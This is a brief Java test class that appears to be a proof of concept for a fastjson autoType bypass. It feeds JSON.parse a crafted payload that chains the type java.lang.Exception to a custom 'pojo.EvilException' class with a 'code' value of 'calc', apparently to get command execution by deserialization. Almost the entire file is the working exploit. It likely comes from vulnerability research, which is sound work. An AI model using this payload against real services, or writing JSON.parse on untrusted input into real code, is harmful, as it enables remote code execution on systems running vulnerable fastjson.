package parse;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import pojo.Student;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Test {
    public static void main(String[] args) throws IOException {
        String poc = "{\n" +
                "\"@type\": \"java.lang.Exception\",\n" +
                "\"@type\": \"pojo.EvilException\",\n" +
                "\"code\": \"calc\"\n" +
                "}";
        JSON.parse(poc);
    }
}
